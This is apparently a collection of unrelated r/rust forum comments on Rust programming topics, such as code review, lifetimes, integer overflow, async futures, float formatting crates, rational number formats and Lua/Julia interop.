A few more things I noticed (mostly stylistic things). * Overall: You define the type of your variables even if it's unnecessary. Defining types even in obvious cases hurts readability IMHO. For example: &amp;#8203; let (mut lb, mut rb) = (0, 0); // Rust will infer that you want to create a tuple of i32s * You can rewrite [this](https://gitlab.com/smit_calculators/RGCalculator/blob/master/arithmetic_string_eval/src/lib.rs#L23-28) block like this: &amp;#8203; let index = match infix.find("*-") { Some(i) =&gt; i, None =&gt; break, }; It's a little less verbose. [You can break out of nested loops with labels](https://doc.rust-lang.org/rust-by-example/flow_control/loop/nested.html) * Personally, i would replace this code: `if ['+','-','/','*','^'].contains(&amp;ch)` with a match statement like this: &amp;#8203; match ch { '+' | '-' | '/' | '*' | '^' =&gt; ... // if contains branch - =&gt; ... // else branch } Your code creates a temporary array and calls the contains function, which is more expensive (i don't know if rustc can optimize this) than using a match statement. It's also more readable. * You don't need to create a block in the match arms [here](https://gitlab.com/smit_calculators/RGCalculator/blob/master/arithmetic_string_eval/src/lib.rs#L186) and you can also omit the return keyword. You can rewrite it like this: &amp;#8203; match op { '+' =&gt; num1 + num2 '-' =&gt; num1 - num2 '/' =&gt; num1 / num2 '*' =&gt; num1 * num2 '^' =&gt; num1.powf(num2) _ =&gt; 0.0 } Also, isn't the `else` branch in this `match` should be an error instead of returning `0.0`?
https://github.com/lokathor/learn-gfx-hal 
@markasoftware * Nice - I just didn't check that and once I needed the parser for resolution I thought of using it for \`Complex\` parsing as well. But this makes more sense. Added. * \`unwrap\_or\_else\` with a closure worked great but I'm not sure how map would go here because there is case where the from\_str of the pair won't succeed (which in turn return Results). * I know - I basically gave a diverged meaning to Err which is exactly the abstraction Either is bringing in. The problem is that I would have to tweak other things like \`unwrap\_or\_else\` to make it work with Either so I'll leave it like this for now.
&gt;Interesting. How rustc see this? Can we somehow use this builtin to force macro rerun? Cargo creates a list of dependencies and compares timestamps since last build. If "dirty" cargo will invoke rustc for rebuild. The following example is using proc\_macros to list files and generating a test-function for each file; if a new file is added or a file is modified cargo will re-run the build-process and re-generating the test-functions. [https://github.com/frehberg/test-generator/tree/master/example](https://github.com/frehberg/test-generator/tree/master/example) Is this close to your use-case? 
Yes, I agree. I think there should be varying layers of security, and the OS is not exempt from that. However, for this conversation, I think we're mostly focusing on crate/module level permissions, right? The tool you're creating operates on the crate level, does it not? If you've been tapped into the Node community, you'll know that Ryan Dahl is trying to create Deno as a response to Node, and one of the things he wants to do is sort of like what you're describing. But this is extremely limited. While you can make a program like eslint (the standard linter for JS) not access the internet using controls on the engine or the operating system, you can make a library like event-stream (just an example) that reads your environment variables and uploads them to a remote server at some random time during program execution. Right now, there's nothing stopping an arbitrary Rust crate from doing the same thing. As I understand it, that's sort of what you're trying to prevent. If your program already accesses environment variables and the network, operating system or virtual machine security just won't do much to prevent that. Additionally, what you're describing happens at runtime. That means it can't be statically analyzed. So while your program could theoretically crash randomly because some library tried to access the network when the whole program wasn't allowed to, you'd have to actually run the crate in the right context to even be able to display a badge on crates.io or cargofox.io. For any practical needs, you'd need to be able to statically analyze the crate to see if it uses any of these resources. Operating system security is just a totally unrelated (though good) thing to have.
There is already an issue about the performance comparing ryu and dtoa [https://github.com/rust-lang/rust/issues/52811](https://github.com/rust-lang/rust/issues/52811)
&gt;But neither Chunk nor ParsingError contain a reference to pos , they only contain references to inner slices of input . That's not what fn parse_chunk&lt;'a&gt;( pos: &amp;'a Position, terminator: u8, ) -&gt; Result&lt;(Chunk&lt;'a&gt;, Position&lt;'a&gt;), ParsingError&lt;'a&gt;&gt; { says. It connects the lifetime of the Position to the lifetime of the Chunk. &amp;#x200B;
The blog doesn't really explain how this is better than float. Why do you need a "surprisingly good replacement" for floats if float are ubiquitous and these aren't faster? (Are they faster?) It *especially* doesn't make sense for things like graphics where a little bit of error is very tolerable. If you're doing mathematics and want accuracy, you probably need full rationals anyway. If you want speed, then there's a question of how you handle large differences in scale which are common in mathematical computations (even simple things like `sin(x)tan(x)` has problems when you approach the asymptotes of `tan`... or other things like `x^100`, problems which floating point was explicitly designed to handle in the best way possible given processor limitations.) Not that it isn't an interesting experiment, but it is an experiment I don't see any practical motivation for (or benchmarks).
Very nice. I was thinking of implementing like with glsl. 
Is there a reason why this isn't used in libcore? Is the output different (which would be a breaking change)?
They do tho, but the version without try panics, where we truncate.
Cool, are you going to upload this to [crates.io](https://crates.io) (so that [docs.rs](https://docs.rs) works..) ?
Yes, it is around 5x faster. I added a comparison in the readme.
I see it now, thanks! `fn parse_chunk&lt;'a, 'b&gt;( pos: &amp;'b Position&lt;'a&gt;, terminator: u8, ) -&gt; Result&lt;(Chunk&lt;'a&gt;, Position&lt;'b&gt;), ParsingError&lt;'a&gt;&gt; {` is the answer.
Glad it worked! :D
Is it correct at all decimal points?
Yes it is correct. Whatever output you get, the mathematically nearest floating point number to that output is the number you started with.
Just sayin': I rejected `rustls` in a project at work precisely because of these reasons. I dream of a rust-only TLS crate implementing certificate pinning.
Oh gosh, I remember running into unums while I was still learning Rust. I tried to implement them in it, but after seeing the size and complexity of a reference implementation, I got overwhelmed and noped out of it. I might try again tho, they're really interesting and that post was very informative. It doesn't look like there's any crates for posit numbers or unums either (that I could access, at least), so it could be something I work on on my free time. Anyways, thank you! I'm glad people like it.
Oh neat! I'll check it out, thank you!
Yeah, floating-point can represent numbers close to zero much better than rationals by using large negative exponents, which floating-bar doesn't have. I added subnormals in an attempt to represent more values close to zero. The closest that an `r32` can get is about 2^-28 ≈ 3.73×10^(-9), while an `f32` can go as low as ~1.175×10^(-38). It would be awesome if floating-bar made it in a programming language! Thank you for keeping it in mind :)
This still doesn't solve the problem of having a thread blocking on stdin, though; it just puts it behind another channel.
Continuing work on my re-implementation of the irc bot rustbot. New version is written in rust and I'm using it to get experience with new features like proc_macro and async/await.
This is super exciting! Are there plans to provide `Send` support at some point, so one could make use of QUIC while using a threadpool executor?
&gt; Hopefully these are the places where salsa's fine-grained incrementality saves us. Preliminarily results are inspiring: we don't do macro expansion, but we do top-down fixed-point name resolution for modules, and it works more or less instantly for completion of `librustc`, even when one modifies module structure. This sounds wonderful! As I mentioned, in IntelliJ it's not much of an issue because the freeze is measured in seconds (single-digits) in the worst case. If we have this level of performance with Rust, it'll be enjoyable :) 
Nice. Are you just publicizing your crates needs or do you intend for other people to chime in and add their own desires ?
Hey, cool project! Interestingly, I also wrote a calculator application as a way to get familiar with Rust, although mine was strictly a CLI (no GUI). Along those lines, here's some loose feedback: Parse the arithmetic expression using a Pratt parser. Pratt parsers are Top-Down-Operator-Precedence parsers and can parse pretty much anything, including left associativity. For example, your calculator incorrectly calculates that `2^3^2 = 64`. The exponentiation operator should be evaluated right-to-left, instead of left-to-right, as `+`/`*`/etc. are. I find this technique so simple and robust that I've [written about it](https://dev.to/jrop/pratt-parsing) in an attempt to understand it better. I also codified it as simply as I believed I could in JavaScript [here](https://github.com/jrop/pratt-calculator). Converting this to Rust proved to be a great way to familiarize myself with the language. As another minor nit-pick, the buttons in the GUI do not seem to be working. That is, they do not update the text-box.
I'd like to collect ideas from others as well. File them as issues! Though I will ask that there be a sufficiently clear design already thought out that somebody could get started working on it immediately, so I may close ideas that require a large amount of design work beyond what is described in the idea.
Yep. Just trying to check with the tokio guys before I do to see if they want anything added (beyond the "this is a fork" message).
I can't help myself, I'm always amazed when seeing a mandelbrot rendering :) &amp;#x200B; I have made one too that runs in the browser with wasm. And it can zoom in\^\^
Prior to async/await syntax, I'd agree fully. However it becomes really simple when using async/await, futures 0.3, and romio. See my other comment in this thread for tls-async built on top of all that. 
It depends on how you convert a and b to i64. For example: https://play.rust-lang.org/?version=stable&amp;mode=release&amp;edition=2018&amp;gist=d052dfb60da153265be9f0aaac461f65 `let result: i64 = a * b;` wouldn't compile if a and b weren't i64.
Direct link to the gist: https://gist.github.com/tov/af73f345710e937ec39a4dbaca4504fe
Thank you, perfect. In retrospect I suppose I should have just fired up the playground and done that test myself! 
It will overflow and cause a panic: https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=c585f018e71ad7de59768c8f97bb3d2b
This supports zoom in too. All you need is a capable png viewer :) 
If you are using a recent version of rustc, going back to using jemalloc may also improve the run-time. In any case, though, the heavy use of `Rc&lt;Expr&gt;` immediately jumps out. Allocation. Deallocation. Pointer-chasing...
That won't compile because Rust requires explicit casting between integer types. The compiler is free to choose between two behaviors for integer operations: either the "wrapping" operation or "checked" followed by an implicit `unwrap`. You can specify explicitly which you desire by using the methods of the built-in types. (Future compilers are allowed to delay the panic as long as it happens before the next side effect.) The current compiler gives you checked math in debugging builds and wrapping math in release. I'm not 100% sure how wrapping multiplication is defined for `i32`, but that sounds right.
This looks like an issue I've had when mixing futures 0.1 and 0.3. A lot of the time it's because a 0.3 future does not return a `Result&lt;T, E&gt;` and a trait was only defined for futures with that output type. I've had more luck using `futures 0.3 preview` and the corresponding `compat`: https://rust-lang-nursery.github.io/futures-api-docs/0.3.0-alpha.11/futures/compat/index.html. Then you'd just slap a `.compat()` and maybe a `.unit_error()` on the `.timeout()` and it should work.
rust is certainly capable, I just prefer the details of how C++ handles operator overloads etc (and the template param values help).
&gt; there a reason why this isn't used in libcore? Is the output different (which would be a breaking change)? It is different, the repo has just been updated. Is it a breaking change? I can't find the specifiaction for float to string conversion.
What does alacritty use? Maybe borrow that code (if it's not already a library).
cc /u/[dtolnay](https://www.reddit.com/user/dtolnay) &amp;#x200B;
Awesome! I have tried using GPU rendering several times and I have given up on it. My Linux machine just doesn't want me to run OpenGL :'( Update: I've cloned your repo, but it too doesn't work on my machine. The commits you did today don't compile yet and the older commits compile, but the program crashes with the message `Invalid machine instruction (core dumped)`. Like I said, my GPU hates me.
Is it much slower than C? Or equally fast?
That is the standard text of the Apache 2.0 license. The rust-lang/rust repo has the same line in their Apache 2.0 license [here](https://github.com/rust-lang/rust/blob/1.32.0/LICENSE-APACHE).
Hey there! NYAR owner here, thanks for the shout-out! &gt; The [not-yet-awesome](https://github.com/not-yet-awesome-rust/not-yet-awesome-rust) list is similarly a catalog of project ideas, but appears to be geared toward relatively broad problem spaces that are not well addressed by the Rust library ecosystem. Some examples from their list: &gt; &gt; * A stream processing pipeline with back pressure for asynchronous processing; &gt; * A deep learning toolkit with GPU support; &gt; * A mature framework for Windows native UI. &gt; &gt; These are things that will involve a significant amount of design work, feedback from multiple stakeholders, a responsive and dedicated maintainer or team, and likely months to years of bake time before they would be considered awesome. I'm not sure how hard you looked but some of the list items are also very specific, like these: &gt; * Bindings for pandoc &gt; * Bindings for git-annex &gt; * The RData file format does not have a parser or emitter yet. &gt; * There are no SGML parsers or emitters on crates.io at all. Granted, things like bindings are complex if one needs to bind a sufficiently broad or deep API, but their design is usually not nearly as complicated as something like a GUI toolkit and could probably correspond to a mid-sized crate. So, in essence, **I think that this project is similar to NYAR except that it has more limited scope (rather than having a different scope altogether)**. There's been much more feedback on broad topics and concerns in NYAR (probably due to how I ask around), but I still accept very specific requests for crates provided the problem/solution pair make sense. If this takes off, I may want to work with you to figure out how to accommodate the different communities for their needs. I can see why something like this might be easier to work with than a fairly nebulous statement of "Enumerate specific use cases and their problems domains" (NYAR's README). I'd love to collaborate with you! If down the road this needs maintainers, I'd also be more than happy to get this repo into the `not-yet-awesome-rust` org! :)
Incidentally, this is sort of the vision I was hoping for with NYAR, just better executed. Kudos! :)
Thanks a lot. All ur suggestions are really helpful and I will improve my code as you suggest. :)
I have a question about async/await. So is this just a syntactic sugar that simplifies usage of a tiny version of the `futures` crate which will be inside `std`? And if so, is it up to the user to provide an event loop?
I use futures 0.1.25, does this still apply?
If you put a bit of work into making it generic this could be something the whole community could use. I understand the desire to avoid dependency hell (like Js), but these are not insignificant libraries on the whole.
The implementation is line-for-line the same as C and performs the same. Readme gives the numbers measured against upstream's benchmark: &gt; The upstream C code, the unsafe direct Rust port, and the safe pretty Rust API all perform the same, taking around 21 nanoseconds to format a 32-bit float and 31 nanoseconds to format a 64-bit float. This is on a uniform random distribution of floating point bit patterns.
&gt; The blog doesn't really explain how this is better than float. It doesn't do that because it never makes that claim. It was an experiment just to see what would happen if things were done differently. &gt; Why do you need a "surprisingly good replacement" for floats if float are ubiquitous and these aren't faster? (Are they faster?) Well one case mentioned by the blog is when testing the coplanarity of points. This could be generalized to other cases that require perfect precision in calculations. I don't have any other examples, which is why I asked where others would find it useful. Arguably yes, if operations for both were implemented the same way (both in hardware or both in software), theoretically floating-bar would be faster, since (afaik) integer operations are faster than their floating-point equivalent. I don't have any concrete numbers I can show tho, and I don't know how to go about doing that. &gt; If you're doing mathematics and want accuracy, you probably need full rationals anyway. Does "full rationals" mean arbitrary-precision rationals here? If so, floating-bar is meant to save space that often gets wasted in such types. I've thought about it and yeah, at large scales this format wouldn't work well, because it isn't designed to cover large scales anyway. I can't comment on trig stuff because rationals quickly become useless there, since most numbers returned would be irrational. In those cases, it would definitely be better to use floating-point. &gt; Not that it isn't an interesting experiment, but it is an experiment I don't see any practical motivation for (or benchmarks). I don't either! Still, "practical motivations" didn't stop me or the blogger from implementing the format. I just did it for fun. As they said in their blog post: &gt; The original idea that kicks a research process is just that, an idea to kick a process, and often you land in totally unexpected places. Or as John Cleese once said, wrong ideas can lead you to good ideas, the creative process does not need to be a sequence or progression of logically correct steps at all time.
I use futures 0.1.25, does this still apply?
I didn't try `jemalloc`, but my system allocator is usually faster. As for the `Rc` usage, it's probably not so bad in this case. There's a lot of sharing between the sub-expressions, so `Rc` is probably fine. An arena allocator might help, though.
For your use case But for bounded mathematics, with proper computation logic, it could be more precise than floating points. I wanted, last year, to represent accurately any number from 0,00000001 to 99999,99999999. I could have used u64 with complex, fine tuning, logics for multiplication and division. But this looks far more promising. If I had this, I would have tried it rather than fixed point numbers.
Thanks. btw which OS are u using ? I have used enigo crate to simulate keypress 
After almost a year and a half of my Steganography library coming up [here](https://www.reddit.com/r/rust/comments/70votb/how_i_turned_a_24_hour_python_project_into_rusts/) I'm finally back on it and trying to get it working. I've started by breaking the 2D-DCT out into it's own library https://github.com/hgallagher1993/discrete_transforms, which I've actually finally got to work (forward and inverse). Also planning to add more transforms like the 2D Haar wavelet transform to discrete_transforms. Still a *very* long way to go before the 2D-DCT is in a usable state anyone to use though.
Great to see this crate and the changes to Ring open sourced. 
Yes, since the `await` macro only works with fut 0.3. Tokio_async_await overloads the macro and does some automatic compatibility wrapping. It's a lot cleaner and easier when you do that manually with futures 0.3 preview imo. 
I am just uncomfortable seeing a sea of pointers in general ;)
Romio and the Futures 0.3 stuff looks pretty slick, thanks for sharing!
A facile answer is that the website and Discord bridge are in production. After all, more than a hundred people have relied on them daily for more than a year. A real answer is that I know of multiple production users in Korea but am unsure what I can share. Since Kodebox is a [RustFest sponsor](https://rome.rustfest.eu/sponsors/), I feel safe to share Kodebox is using Rust for "A blockchain technology on a mission to create and enable smarter asset management systems". Sorry if you don't care about blockchains. But sharable production references are hard to get while blockchains seem very willing to advertise they use Rust.
I was looking through the source of std::time::SystemTime, and the type declaration for SystemTime is: \#\[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)\] \#\[stable(feature = "time2", since = "1.8.0")\] pub struct SystemTime(time::SystemTime); &amp;#x200B; Can anybody explain why this doesn't , since this is written like an infinite recursive constructor (To make a SystemTime, you need to give me a SystemTime, which needed a SystemTime, which needed...). I tried to make something just to see if I was missing an obvious syntactic answer, but the compiler rightly complained "recursive type has infinite size". 
Thank you. I never thought this can solved this much easily.. I was reading through your code. In line 21 , you are evaluating an expression " let Some(boxed\_node) = self.left.as\_mut()" is this just assignment expression? its going to be True always.. and you are calling the method insert\_left recursively .. am I correct ? } else if let Some(boxed\_node) = self.left.as\_mut() { boxed\_node.insert\_left(value); } &amp;#x200B;
I believe the functionality you are looking for is provided by [wrapping\_mul](https://doc.rust-lang.org/std/primitive.u32.html#method.wrapping_mul) (though you should double check that signed ints works as you want). 
Thanks, I updated the description of NYAR to mention that you include a range of projects including small ones. Let me know or send a PR if you'd like any other change to the wording to characterize NYAR more accurately. I think the distinguishing factor is that for Request For Implementation ideas somebody can dive straight into code and start implementing it. I don't think that is the case even for the four narrow items you called out. I have found safe FFI bindings quite challenging to design well, and the RData and SGML libraries would need to have their whole public API designed (consider for example how different the APIs of the `serde_yaml` and `yaml_rust` crates are, even though both are for the same format). Request For Implementation is an experiment -- if it works out, that would be a good indication that the thing missing from NYAR is some space for people to contribute *designs* for the ideas on the list without also tackling the *implementations*.
I started writing a posit implementation, but got some complications since I was using `typenum` to use an arbitrary number of bits. I then looked into `uX`, but it didn't have the necessary methods yet, nor did it implement any `num-traits` to allow genericity.
&gt; The current compiler gives you checked math in debugging builds and wrapping math in release. Note that this is only the default behavior; you are perfectly allowed to chose otherwise. 
I encourage you to read [Myths and Legends about Integer Overflow in Rust](http://huonw.github.io/blog/2016/04/myths-and-legends-about-integer-overflow-in-rust/); the article is from 2016, but still state-of-the-art.
I notice that you're dropping errors in two places. The first is `if let Ok(key) = evt` and the second is `if sendinput.send(Message::Input(key)).is_err()`. In both cases you never print anything or propagate the error to the caller. Consider using `unwrap` or `expect` to turn those errors into panics, so that you can see what's going wrong.
This is great. I've often had an idea for a crate only to find out someone already did it. It would be cool if it also had difficulty ratings and indicated whether mentorship is available.
An arena allocator is a great tool for this in Rust. A systems language doesn't automatically make things fast, but usually provides more power for doing so when required, and especially in Rust, where the faster code is often as safe as the obvious/slow code.
This is really cool. Thanks! :) p.s. cool fox logo
Maybe this isn't really an answerable question, but I'm going to try anyway: *Why* `if let`? I get what it does, and it's great having a convenient shorthand for a one-armed `match`. What I don't get is the relation between the choice of term and what it's actually doing. `if` makes sense to me -- it's a conditional -- but wtf is `let` doing in there? The only reason I'm even asking is because knowing what keywords actually *mean* is pretty integral to my personal learning process, and this one being seemingly nonsensical is making it really hard for me to easily grok code that uses it, let alone write it myself...
I believe the page is https://4e6.github.io/firefox-lang-stats/?
Thank you!
Really great analysis. I'm learning Rust too so your insights are really helpful :) &gt; Your code creates a temporary array and calls the contains function, which is more expensive Do you know of a cheatsheet or chart somewhere that lists common Rust functions that do similar things and shows which are more expensive than others and when/why you'd want to make that trade off? Thanks :) 
.... I have to reevaluate some life decision. Why did I even bother with cross-browser `ScrollEvents`? I could have finished it 10 years ago...
is there a type of democratic style server, where people dont kill each other. And if they do they become a sort of "wanted" person?
I don't exactly know what's going on, but if you have 2 different types of future returned from the same function, you can use `futures::Either` to unify the types.
Hard coding seems like a great idea (if slightly unfortunate). With `static mut` and mutations, the compiler is unlikely to be able to inline any of the values, which a `const` would solve. It would also solve the risk of precision issues in `pade_coefficient`, as you could calculate them exactly/in very high precision and then round to `f64` (but, maybe this algorithm is well-conditioned on these values, so it doesn't matter so much?).
I am on MacOS
&gt;You can break out of nested loops with labels TIL
That's true, but even in those cases the "fast" can still be justified, especially if there's a natural reference point (like `std`, in this case).
I'm talking about the built-in implementation of the operators, what `a * b` means. Unless I missed it, there's nothing in the language (yet) that allows you to specify which interpretation the compiler should choose. There is a compiler pragma, `overflow-checks`. It applies to the entire artifact - the crate and possibly all functions inlined from other crates. https://doc.rust-lang.org/rustc/codegen-options/index.html And that means your code *must* tolerate the ambiguity unless you can control the entire build process. Bottom line: if you know that overflowing is a bug but you can tolerate either wrapping or panic, use the default operators. If you know that wrapping is correct, you *must* use a newtype (like `Wrapping`) or the `wrapping_*` methods, unless you don't care about code reuse and leaking implementation details globally. If you must catch and and handle overflows for security or correctness, you have to do so explicitly.
&gt; Bindings for pandoc &gt; &gt; Bindings for git-annex &gt; &gt; The RData file format does not have a parser or emitter yet. &gt; &gt; There are no SGML parsers or emitters on crates.io at all. Someone brought up the other day of doing what the flask post did with the top python packages. I immediately thought of NYAR but I realized the list's length could have a negative impact on usability and your examples kind of reinforces my concern. This makes me wonder if we should either curate our lists for relative importance in the community or provide some kind of UX to rank relevance, demand, or some other trait.
Well, our community definitely does not tolerate killing each other. You want /r/playrust, this sub is about Rust programming language.
Well, `let` accepts patterns for destructuring (as in `let (a, Foo(b), _) = ...`), but they have to be irrefutable (otherwise what `let Some(x) = None` is supposed to do?). So for me it kind of makes sense to have a version that is "try to destructure this" - by sticking it inside `if` or `while` condition.
That was my first thought as well. Rust is a great language, but web is not really where it shines. The web is frequently about fast prototyping and quickly working out ideas, performance comes second (and usually the bottleneck is database or IO, not the lanuage itself). This is were GC langauges like Java, Pyhton and node.js really shines. Rust aims for performance and direct hardware access, which great for low-level or performant stuff.
A neat UX for this would be a data source for https://shields.io backed by issue thumbs count -- so that I could include in the readme: ![](https://img.shields.io/github/issues/detail/thumbs/:user/:repo/:number.svg) and it would render as a 👍 thumbs up with the count of thumbs up next to it. React to the issue to signal relevance to you, and that will become visible on the readme.
Can you skip updating all the following keys by adding a layer of indirection: Instead of providing a line number, provide a Line ID that is immutable for a given line, and map Line IDs to line numbers somewhere else. I guess you'll need to update that ID map anyway, but updating the value of a `(Hash|BTree)Map` should be easier than updating the keys. You could also cluster edits to the ID map by keeping a `Vec&lt;StateChange&gt;`, and periodically performing a cleanup step that pulls those changes into the ID map.
[these clippy lints](https://rust-lang.github.io/rust-clippy/v0.0.212/index.html) might be a good start
So you mean that you think of `let` as something like `let &lt;pattern&gt; = &lt;value&gt;`, and then the `if` (or `while`, which I learned about just a couple of minutes before you posted) is saying "if this is valid"? It still seems kind of weird to me, given that the "default" case is rather `let &lt;variable&gt; = &lt;value&gt;`, but I suppose if you think of a variable as a "pattern" that includes its type then this does kind of make sense...
Ah, so you're saying an async fn doesn't need a stack frame in the "normal sense", but that the Future that it returns IS the stack frame (+ a field for the "actual" return value once it completes, stuff needed for the state machine etc.). That makes sense, I guess, and would solve the problems with sync and async stacks clobbering each other I was wondering about. I vaguely recall reading somewhere that async fn's are not allowed to recurse, which would solve the issue of how that would work.. Thanks for the explanation! 
At some point [docs.rs](https://docs.rs) will populate: [https://crates.io/crates/tls-async](https://crates.io/crates/tls-async)
It's possible that /u/Jop902/ was operating on the assumption that all C standard libraries are equally performant at this task and was asking how it compares to glibc and so on.
&gt; Well, our community definitely does not tolerate killing each other. Except on benchmarks, am I right?! \*crickets\* I'll show myself out.
Awesome! Thank you :)
Yeah that's a good idea, I'll try that, thanks!
Variable is a pattern - one that matches anything, and binds matched value to the name (`_` also matches anything, but immediately drops the value). So the syntax for `let` currently *is* `let &lt;pattern&gt; = &lt;expr&gt;` (or `let &lt;pattern&gt;: &lt;type&gt; = &lt;expr&gt;` - you can add type annotations not just on variables: `let (x, y): (i32, bool) = (1, true)`). And if [generalized type ascription RFC](https://github.com/rust-lang/rfcs/pull/2522) is merged, then the syntax `let &lt;pattern&gt; = &lt;expr&gt;` would be the exact syntax allowed in `let` statements.
Wrong sub, mate
That's a different way of thinking than I'm used to, but I suppose that's par for the course when learning a new language anyway. Thanks, I think this makes a lot more sense now!
Its not official documentation, but in the O'Reilly "Programming Rust" book they suggest "ref x" or "ref mut x" for those particular cases.
Yeah, I dug up a few of John Gustafson papers on the topic and it's interesting to see how they change over time. My impression is they start off with "this is an interesting mathematical structure that could be useful for computers and encoded like this" and get steadily more and more concrete and pragmatic, while accepting more and more mathematical limitations and tradeoffs for implementation ease and speed. Posit's seem to be the latest incarnation of this trend, but maybe not the end point.
I know this project that maybe suits your needs &amp;#x200B; [https://github.com/felipenoris/JuliaPackageWithRustDep.jl](https://github.com/felipenoris/JuliaPackageWithRustDep.jl)
Thanks, that's actually a quite good idea.
I think that is going in the Julia -&gt; Rust direction, and not Rust -&gt; Julia? (where X -&gt; Y means call X functions from Y)
I've been working on making SIMDeez able to fall back to scalar code on platforms that don't have any SIMD intrinsic support in Rust yet (or that don't have SIMD at all). I've also gotten the compile time down from 2 minutes to 5 seconds! &amp;#x200B; [https://github.com/jackmott/simdeez](https://github.com/jackmott/simdeez) &amp;#x200B; I've also updated the simd-noise crate to use the new SIMDeez, which just makes it compile a lot faster. [https://github.com/jackmott/rust-simd-noise](https://github.com/jackmott/rust-simd-noise) &amp;#x200B; &amp;#x200B;
I hope one day I understand a word of this post lol
Wrote this https://github.com/djhworld/zipit Fully aware you can probably write this using `awk`, or some combination of other tools, but I'm a beginner to Rust and I was doing some stuff with log files the other day which gave me the idea. 
I wish to one day understand a word of this post lol
&gt; Types from `proc_macro` […] cannot ever exist in code outside of a procedural macro. Why is that? Is it a limitation/bug that should eventually be fixed? Is https://github.com/rust-lang/rust/pull/49219 relevant here?
Hiya, wondering what I should do, if anything, with my (unmaintained) crate. I wrote it ages ago when I was playing around with rust and then forgot about it until I got a bug report a couple days ago. I don't work with rust anymore (don't even have the toolchain installed) nor do I think the library is particularly interesting so I'd like to just leave it dormant, but I don't want to be a jerk about it. So what do I do? Stick "unmaintained" into the github readme and package description? I never released a major version, is that enough to warn people not to rely on it?
/r/playrust
I could not resist the temptation. The code does not exploit the Rc much, I'm not sure any Rc handle is \_ever\_ cloned, leading to tons of reallocation. I made a few hacky changes, wrapping the Expr in a \`struct ExprRef(Rc&lt;Expr&gt;)\` and doing all calculations on that, so Rc-refs can be cloned. The runtime for the 11th derivative went down from \~18 seconds to 10, so closer to the claims of double performance compared to the unmentioned GC:ed functional languages. (When actually \_using\_ the reference counts, surprise) It could make an interesting approach to, instead of using refcount to avoid excessive allocation, consume expressions, overwrite the existing memory (using Cell/RefCell) and returning the recycled allocation. Something left to try...
The scope of `DifferentialEquations.jl` is sheer amazing and I was looking at it longingly. On the other hand, it's pretty much overkill for what I am doing. Do you actually need all of it, or is there some subset you are interested in? We have a few ODE integrators in Rust. I have in mind: + [`ndarray-odeint`](https://github.com/termoshtt/eom) (a bit unfortunately named, because it uses `ndarray` under the hood, but is not part of its organization); + [`ode-solvers`](https://github.com/srenevey/ode-solvers): this one uses `nalgebra`. If I understand it correctly, its number of dimensions is expressed in types. That's really cool, but unfortunately restricts the system sizes. + [`rust-freude`](https://github.com/superfluffy/rust-freude): some similary to `ndarray-odeint`; also uses `ndarray` (note: I am the author of that crate). I think I also found a crate that implemented a Runge Kutta 4 and some other integrators for internal use... So, people are writing integrators, but the effort is very diffuse at the moment. Depending on your needs, maybe you can choose one of the above crates and submit a function you need?
As far as I remember, it's for both
&gt;In line 21 , you are evaluating an expression " let Some(boxed\_node) = self.left.as\_mut()" is this just assignment expression? its going to be True always.. Yes, it's used just for destructuring. The following would work as good. self.left.as_mut().map(|boxed_node| boxed_node.insert_left(value)); Yes, I'm calling it recursively here. Iteration over `Box` with mutation is much uglier because the owner of `Box` has to be unique. You could use `Rc&lt;RefCell&lt;Node&gt;&gt;` instead of `Box`
That issue only affects the linking story for proc_macro. Previously anything transitively depending on proc_macro (including through proc_macro2) from main.rs or build.rs would introduce a dynamically linked dependency on a shared library from the compiler. That was unfortunate in situations where everything else could be linked statically. Now libproc_macro links just like libcore or libstd without a dynamic dependency. But nothing about the behavior has changed -- in particular, you still need context set up by the compiler in order to invoke anything from proc_macro just like before. Everything behaves exactly the same except statically linked not dynamically linked. If we decide to, the fix would be to copy all of proc_macro2 into proc_macro and use that as the public API of proc_macro. It's not clear that we want this because proc_macro is designed as a foundation for procedural macros, it is not intended as a general solution to working with Rust code. The existing stable API transfers fairly easily to other use cases but upcoming APIs like diagnostics do not, as that requires a fairly hefty amount of infrastructure from the compiler.
I hope I'm not misreading anything, but it sounds like this isn't going to help much with coplanarity testing. From the linked blog: &gt; So now I was at a place where I needed to do something dramatic. It seemed like I needed to start chopping numbers and losing precision if I wanted to prevent the numbers from growing without limits. The whole exercise started from the idea of exploring exact rendering, but at this point I felt I had to give up on that idea [...] I'm really not trying to criticize this work on its merits as a personal project or pedagogical presentation. Just trying to elucidate the reason why I think it will be difficult to find something with worse range and performance than floating point which will be more useful than it without being arbitrary precision rationals. There's room in there to be sure, but not many problems that seriously demand something from within.
Nice! I've had a great experience with tossing ideas out there and letting someone else to implement them in Rust so far. And I am perfectly serious as I say that. Sadly I've got nothing to add to the list because I've recently prototyped the last two unimplemented ideas I've had.
Yeah, but the idea is that you're actually supposed to fill those in. It's like leaving the blanks in a legal form unfilled. It's not the best practice.
Will Firefox use it for it's implementation of QUIC?
Not at all, weak references can be created even when the value is mutably borrowed (you can even create new ones from `RefMut&lt;'b, T&gt;`), but they can't be upgraded back to a `Strong&lt;T&gt;` when the borrow is alive.
[Here's the julia page on embedding in C code.](https://docs.julialang.org/en/v1/manual/embedding/index.html) In theory, it's not *that* much different for a `-sys` crate in Rust. You'll just need to use bindgen to generate the `extern "C"` declarations and type definitions in Rust and get the linkage right, though I'll admit that can be a bit daunting if you haven't set up a `-sys` crate before. You'd most likely want a higher-level interface than the `unsafe` `extern "C"` functions though, and that can present more of a challenge, depending on what kind of API it exposes.
/r/playrust
I've used proc_macro2 types such as TokenStream just yesterday outside of proc_macro context. I'm parsing a bunch of function. Although the only way I interact with it directly is let arg_type: syn::Type = //implementation here; write!(f, " {}", &amp;arg_type.clone().into_token_stream())?; which is probably an inefficient way to pretty-print a type, actually. I'm open to suggestions.
I could stand to put more examples of this in the documentation for rlua, but this is definitely something you can do. I’m on mobile right now so I can’t really give a great example, but there’s one *tiny* example of this in the guided tour: https://github.com/kyren/rlua/blob/acb61b720ac69965bb4df6afad556a681486c152/examples/guided_tour.rs#L97 The reason there are not many examples of this is that functions are not even special, in every way that you can manage Lua *values* you can manage Lua functions, because functions are one of the basic Lua values. In that example in the guided tour, the string key is a constant string, but it can be anything (anything!) that implements ToLua, so you can definitely use a dynamic string here, or drill down several tables like in magmaCube’s example. You can do more than that, though, you can return functions to Rust from other Lua functions, if you need to keep long term references to Lua functions you can put them in the registry, you can do with them whatever you want, because they’re just values. I would give you a more full example but like I said I’m on mobile right now, but if you have any other questions about how to do this or about rlua in general feel free to ask!
